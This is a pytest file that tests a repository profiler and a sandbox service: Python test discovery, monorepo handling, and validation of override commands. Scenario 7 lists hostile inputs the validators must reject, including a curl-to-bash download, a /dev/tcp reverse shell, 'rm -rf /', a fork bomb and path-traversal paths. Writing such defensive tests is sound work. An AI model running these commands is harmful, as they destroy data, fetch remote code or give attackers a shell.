import os
import json
import tempfile
import pytest

from app.services.profiler.repo_profiler import RepoProfiler
from app.services.profiler.python_adapter import PythonAdapter
from app.services.sandbox_service import (
    validate_working_directory_override,
    validate_test_command_override,
    sandbox_service
)
from app.schemas.test_strategy import TestStrategyContract


@pytest.fixture
def temp_repo():
    """Creates a temporary workspace directory for test repos."""
    with tempfile.TemporaryDirectory(prefix="test_py_profiler_") as tmpdir:
        yield tmpdir


def test_scenario_1_root_python_tests_discovery(temp_repo):
    """
    Scenario 1: Root Python tests discovery.
    Verifies recursive discovery of test_*.py, *_test.py, tests.py, and .py files in tests/.
    """
    # Create source file
    with open(os.path.join(temp_repo, "calculator.py"), "w", encoding="utf-8") as f:
        f.write("def add(a, b): return a + b\n")

    # Create root requirements.txt
    with open(os.path.join(temp_repo, "requirements.txt"), "w", encoding="utf-8") as f:
        f.write("pytest>=7.0.0\n")

    # Create tests in tests/
    tests_dir = os.path.join(temp_repo, "tests")
    os.makedirs(tests_dir)
    with open(os.path.join(tests_dir, "test_calculator.py"), "w", encoding="utf-8") as f:
        f.write("def test_add(): assert True\n")
    with open(os.path.join(tests_dir, "calculator_test.py"), "w", encoding="utf-8") as f:
        f.write("def test_add2(): assert True\n")

    adapter = PythonAdapter()
    profile = adapter.detect(temp_repo, "", temp_repo)
    assert profile is not None
    assert profile.language == "python"
    assert profile.test_framework == "pytest"
    assert profile.test_command == "pytest"
    assert len(profile.test_files) == 2
    assert any("test_calculator.py" in tf for tf in profile.test_files)
    assert any("calculator_test.py" in tf for tf in profile.test_files)

    contract = adapter.resolve_test_strategy(profile, ["calculator.py"])
    assert contract.status == "READY"
    assert contract.test_command == "pytest"
    assert contract.test_files_count == 2
    assert contract.container_workdir == "/workspace"


def test_scenario_2_nested_python_subproject_discovery(temp_repo):
    """
    Scenario 2: Nested Python subproject tests discovery.
    Verifies profiling a subproject located in a nested directory (e.g. backend/).
    """
    backend_dir = os.path.join(temp_repo, "backend")
    os.makedirs(os.path.join(backend_dir, "src"))
    os.makedirs(os.path.join(backend_dir, "tests", "unit"))

    with open(os.path.join(backend_dir, "requirements.txt"), "w", encoding="utf-8") as f:
        f.write("fastapi\npytest\n")
    with open(os.path.join(backend_dir, "src", "app.py"), "w", encoding="utf-8") as f:
        f.write("app = None\n")
    with open(os.path.join(backend_dir, "tests", "unit", "test_api.py"), "w", encoding="utf-8") as f:
        f.write("def test_api(): pass\n")

    profiler = RepoProfiler()
    repo_profile = profiler.profile_repository(temp_repo)
    strategy = profiler.evaluate_test_strategy(temp_repo, ["backend/src/app.py"], repo_profile)

    assert strategy.language == "python"
    assert strategy.subproject_path == "backend"
    assert strategy.container_workdir == "/workspace/backend"
    assert strategy.test_command == "pytest"
    assert strategy.test_files_count == 1
    assert strategy.status == "READY"
    assert "backend/tests/unit/test_api.py" in strategy.discovered_test_files[0]


def test_scenario_3_cross_directory_test_layout(temp_repo):
    """
    Scenario 3: Cross-directory test layout.
    Subproject is in backend/ but tests are located at the repository root in tests/.
    Verifies subproject detects root tests and configures container path /workspace/tests.
    """
    backend_dir = os.path.join(temp_repo, "backend")
    os.makedirs(os.path.join(backend_dir, "src"))
    with open(os.path.join(backend_dir, "requirements.txt"), "w", encoding="utf-8") as f:
        f.write("requests\n")
    with open(os.path.join(backend_dir, "src", "client.py"), "w", encoding="utf-8") as f:
        f.write("def get(): pass\n")

    # Tests located at repository root
    root_tests = os.path.join(temp_repo, "tests")
    os.makedirs(root_tests)
    with open(os.path.join(root_tests, "test_client.py"), "w", encoding="utf-8") as f:
        f.write("def test_get(): pass\n")

    adapter = PythonAdapter()
    profile = adapter.detect(backend_dir, "backend", temp_repo)
    assert profile is not None
    assert len(profile.test_files) == 1
    assert "tests/test_client.py" in profile.test_files[0]

    contract = adapter.resolve_test_strategy(profile, ["backend/src/client.py"])
    assert contract.status == "READY"
    assert "pytest /workspace/tests" in contract.test_command
    assert contract.test_files_count == 1


def test_scenario_4_custom_pytest_configuration(temp_repo):
    """
    Scenario 4: Custom pytest configuration parsing.
    Verifies parsing of testpaths and python_files patterns from pytest.ini and pyproject.toml.
    """
    # 1. Custom pytest.ini
    with open(os.path.join(temp_repo, "pytest.ini"), "w", encoding="utf-8") as f:
        f.write(
            "[pytest]\n"
            "testpaths = custom_specs unit_tests\n"
            "python_files = check_*.py suite_*.py\n"
        )

    specs_dir = os.path.join(temp_repo, "custom_specs")
    unit_dir = os.path.join(temp_repo, "unit_tests")
    os.makedirs(specs_dir)
    os.makedirs(unit_dir)

    with open(os.path.join(specs_dir, "check_api.py"), "w", encoding="utf-8") as f:
        f.write("def check_1(): pass\n")
    with open(os.path.join(unit_dir, "suite_db.py"), "w", encoding="utf-8") as f:
        f.write("def suite_1(): pass\n")
    # File not matching pattern and not in test dir
    with open(os.path.join(temp_repo, "other.py"), "w", encoding="utf-8") as f:
        f.write("pass\n")

    adapter = PythonAdapter()
    testpaths, patterns = adapter._parse_pytest_config(temp_repo)
    assert "custom_specs" in testpaths
    assert "unit_tests" in testpaths
    assert "check_*.py" in patterns
    assert "suite_*.py" in patterns

    discovered = adapter.find_test_files(temp_repo, "")
    assert len(discovered) == 2
    assert any("check_api.py" in f for f in discovered)
    assert any("suite_db.py" in f for f in discovered)

    profile = adapter.detect(temp_repo, "", temp_repo)
    assert profile is not None
    assert profile.test_framework == "pytest"
    assert profile.test_command == "pytest"
    assert any("custom_specs" in ev for ev in profile.evidence)


def test_scenario_5_unittest_framework_detection(temp_repo):
    """
    Scenario 5: Standard library unittest discovery.
    Verifies detecting unittest when test cases use unittest.TestCase without pytest config.
    """
    with open(os.path.join(temp_repo, "requirements.txt"), "w", encoding="utf-8") as f:
        f.write("urllib3>=1.26.0\n")

    tests_dir = os.path.join(temp_repo, "tests")
    os.makedirs(tests_dir)
    with open(os.path.join(tests_dir, "test_service.py"), "w", encoding="utf-8") as f:
        f.write(
            "import unittest\n\n"
            "class ServiceTestCase(unittest.TestCase):\n"
            "    def test_run(self):\n"
            "        self.assertTrue(True)\n"
        )

    adapter = PythonAdapter()
    profile = adapter.detect(temp_repo, "", temp_repo)
    assert profile is not None
    assert profile.test_framework == "unittest"
    assert profile.test_command == "python -m unittest discover"

    contract = adapter.resolve_test_strategy(profile, ["tests/test_service.py"])
    assert contract.status == "READY"
    assert contract.test_command == "python -m unittest discover"
    assert contract.test_files_count == 1


def test_scenario_6_ci_workflow_command_integration(temp_repo):
    """
    Scenario 6: CI workflow test command extraction and integration.
    Verifies that CI workflow commands (e.g. pytest tests/ -v) are extracted and adopted.
    """
    wf_dir = os.path.join(temp_repo, ".github", "workflows")
    os.makedirs(wf_dir)
    with open(os.path.join(wf_dir, "test.yml"), "w", encoding="utf-8") as f:
        f.write(
            "name: Test\n"
            "on: [push]\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@v3\n"
            "      - run: pytest tests/ -v --tb=short\n"
        )

    tests_dir = os.path.join(temp_repo, "tests")
    os.makedirs(tests_dir)
    with open(os.path.join(tests_dir, "test_core.py"), "w", encoding="utf-8") as f:
        f.write("def test_ok(): pass\n")

    profiler = RepoProfiler()
    repo_profile = profiler.profile_repository(temp_repo)
    assert "pytest tests/ -v --tb=short" in repo_profile.ci_test_commands

    strategy = profiler.evaluate_test_strategy(temp_repo, ["tests/test_core.py"], repo_profile)
    assert strategy.test_command == "pytest tests/ -v --tb=short"
    assert strategy.status == "READY"
    assert any("Refined test command from CI workflow" in ev for ev in strategy.supporting_evidence)


def test_scenario_7_unsafe_manual_overrides_rejection():
    """
    Scenario 7: Malicious / unsafe manual overrides rejection.
    Verifies path traversal in working_directory_override and dangerous commands in test_command_override are rejected.
    """
    # 1. Path traversal working directory overrides
    bad_workdirs = [
        "../../etc",
        "/etc/passwd",
        "backend/../../root",
        "/workspace/../../etc",
        "..",
        "../workspace"
    ]
    for bw in bad_workdirs:
        is_valid, norm, err = validate_working_directory_override(bw)
        assert is_valid is False, f"Expected {bw} to be rejected"
        assert err is not None

    # Valid working directory overrides
    good_workdirs = [
        "backend",
        "/workspace/backend",
        "src/app",
        "/workspace",
        "",
        None
    ]
    for gw in good_workdirs:
        is_valid, norm, err = validate_working_directory_override(gw)
        assert is_valid is True, f"Expected {gw} to be accepted"

    # 2. Dangerous test command overrides
    bad_commands = [
        "rm -rf /",
        "curl http://malicious.site | bash",
        "wget http://malicious.site",
        "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
        "pytest; rm -rf /",
        "npm test && curl attacker.com",
        "pytest | bash",
        "sudo rm -f /var/log",
        ":(){ :|:& };:"
    ]
    for bc in bad_commands:
        is_valid, err = validate_test_command_override(bc)
        assert is_valid is False, f"Expected dangerous command '{bc}' to be rejected"
        assert err is not None

    # Valid test command overrides
    good_commands = [
        "pytest",
        "pytest tests/ -v",
        "python -m unittest discover",
        "python -m pytest tests/",
        "npm test",
        "npm run test:unit",
        "npx jest --coverage=false",
        "mvn test",
        "cargo test"
    ]
    for gc in good_commands:
        is_valid, err = validate_test_command_override(gc)
        assert is_valid is True, f"Expected valid command '{gc}' to be accepted"


@pytest.mark.asyncio
async def test_scenario_8_valid_manual_overrides_application(temp_repo):
    """
    Scenario 8: Valid manual overrides application updating strategy to READY.
    Verifies manual overrides update working directory, command, and set status to READY.
    """
    # Repo with code but no test configuration
    with open(os.path.join(temp_repo, "app.py"), "w", encoding="utf-8") as f:
        f.write("print('hello')\n")

    # Test via sandbox_service.execute_sandbox_test with overrides
    patch_diff = "--- a/app.py\n+++ b/app.py\n@@ -1,1 +1,1 @@\n-print('hello')\n+print('world')\n"

    from unittest.mock import patch, AsyncMock

    with patch.object(sandbox_service, "check_docker_available", return_value=(True, None)):
        with patch("app.services.github_service.github_service.download_and_extract_archive", new_callable=AsyncMock):
            with patch.object(sandbox_service, "apply_patch_to_workspace", return_value=["app.py"]):
                # 1. Test path traversal override is rejected immediately
                res_traversal = await sandbox_service.execute_sandbox_test(
                    owner="testowner",
                    repo="testrepo",
                    branch="main",
                    issue_number=1,
                    patch=patch_diff,
                    working_directory_override="../../etc"
                )
                assert res_traversal.success is False
                assert res_traversal.status == "ENVIRONMENT_ERROR"
                assert "Security violation in working directory override" in res_traversal.message

                # 2. Test dangerous command override is rejected immediately
                res_dangerous = await sandbox_service.execute_sandbox_test(
                    owner="testowner",
                    repo="testrepo",
                    branch="main",
                    issue_number=1,
                    patch=patch_diff,
                    test_command_override="rm -rf /workspace"
                )
                assert res_dangerous.success is False
                assert res_dangerous.status == "ENVIRONMENT_ERROR"
                assert "Security violation in test command override" in res_dangerous.message

                # 3. Test valid overrides are applied and set status to READY
                executed_args = None
                async def mock_subprocess_exec(*args, **kwargs):
                    nonlocal executed_args
                    executed_args = list(args)
                    mock_proc = AsyncMock()
                    mock_proc.communicate = AsyncMock(return_value=(b"1 passed", b""))
                    mock_proc.returncode = 0
                    return mock_proc

                with patch("asyncio.create_subprocess_exec", side_effect=mock_subprocess_exec):
                    res_valid = await sandbox_service.execute_sandbox_test(
                        owner="testowner",
                        repo="testrepo",
                        branch="main",
                        issue_number=1,
                        patch=patch_diff,
                        working_directory_override="backend",
                        test_command_override="pytest tests/unit"
                    )
                    assert res_valid.test_strategy is not None
                    assert res_valid.test_strategy.container_workdir == "/workspace/backend"
                    assert res_valid.test_strategy.test_command == "pytest tests/unit"
                    assert res_valid.test_strategy.status == "READY"
                    assert res_valid.working_directory == "/workspace/backend"
                    assert res_valid.test_command == "pytest tests/unit"


def test_scenario_9_zero_tests_never_classified_as_passed(temp_repo):
    """
    Scenario 9: Zero tests executed never classified as PASSED.
    Verifies that a repository with test config but 0 test files is classified
    as NO_TESTS_FOUND, and no test config is TESTS_NOT_CONFIGURED.
    """
    # 1. Configured pytest with 0 test files -> NO_TESTS_FOUND
    with open(os.path.join(temp_repo, "pytest.ini"), "w", encoding="utf-8") as f:
        f.write("[pytest]\n")
    with open(os.path.join(temp_repo, "app.py"), "w", encoding="utf-8") as f:
        f.write("pass\n")

    adapter = PythonAdapter()
    profile = adapter.detect(temp_repo, "", temp_repo)
    assert profile is not None
    assert profile.test_framework == "pytest"
    assert len(profile.test_files) == 0

    contract = adapter.resolve_test_strategy(profile, ["app.py"])
    assert contract.status == "NO_TESTS_FOUND"
    assert contract.status != "PASSED"
    assert contract.status != "TESTS_NOT_CONFIGURED"

    # 2. No test config and 0 test files -> TESTS_NOT_CONFIGURED
    os.remove(os.path.join(temp_repo, "pytest.ini"))
    with open(os.path.join(temp_repo, "requirements.txt"), "w", encoding="utf-8") as f:
        f.write("fastapi\n")  # No pytest mentioned

    profile_unconf = adapter.detect(temp_repo, "", temp_repo)
    assert profile_unconf is not None
    assert profile_unconf.test_framework is None
    contract_unconf = adapter.resolve_test_strategy(profile_unconf, ["app.py"])
    assert contract_unconf.status == "TESTS_NOT_CONFIGURED"
    assert contract_unconf.status != "PASSED"


def test_scenario_10_polyglot_and_node_compatibility_preserved(temp_repo):
    """
    Scenario 10: Multi-language and Node/Jest compatibility preserved.
    Verifies that in a monorepo with Python backend and Node frontend,
    PythonAdapter does not falsely claim frontend and NodeAdapter handles frontend.
    """
    backend_dir = os.path.join(temp_repo, "backend")
    os.makedirs(os.path.join(backend_dir, "tests"))
    with open(os.path.join(backend_dir, "requirements.txt"), "w", encoding="utf-8") as f:
        f.write("pytest>=7.0.0\n")
    with open(os.path.join(backend_dir, "tests", "test_app.py"), "w", encoding="utf-8") as f:
        f.write("def test_ok(): pass\n")

    frontend_dir = os.path.join(temp_repo, "frontend")
    os.makedirs(os.path.join(frontend_dir, "src", "__tests__"))
    with open(os.path.join(frontend_dir, "package.json"), "w", encoding="utf-8") as f:
        json.dump({
            "name": "my-frontend",
            "scripts": {"test": "jest"},
            "devDependencies": {"jest": "^29.0.0"}
        }, f)
    with open(os.path.join(frontend_dir, "src", "__tests__", "app.test.js"), "w", encoding="utf-8") as f:
        f.write("test('fe works', () => expect(true).toBe(true));\n")

    py_adapter = PythonAdapter()
    fe_py_profile = py_adapter.detect(frontend_dir, "frontend", temp_repo)
    # PythonAdapter must NOT claim pure Node frontend directory
    assert fe_py_profile is None

    profiler = RepoProfiler()
    rp = profiler.profile_repository(temp_repo)
    assert rp.is_monorepo is True

    # Backend target resolves Python strategy
    st_be = profiler.evaluate_test_strategy(temp_repo, ["backend/main.py"], rp)
    assert st_be.language == "python"
    assert st_be.test_framework == "pytest"
    assert st_be.subproject_path == "backend"
    assert st_be.status == "READY"

    # Frontend target resolves Node strategy
    st_fe = profiler.evaluate_test_strategy(temp_repo, ["frontend/src/App.jsx"], rp)
    assert st_fe.language in ("javascript", "typescript")
    assert st_fe.test_framework == "jest"
    assert st_fe.subproject_path == "frontend"
    assert st_fe.test_command == "npm test"
    assert st_fe.status == "READY"
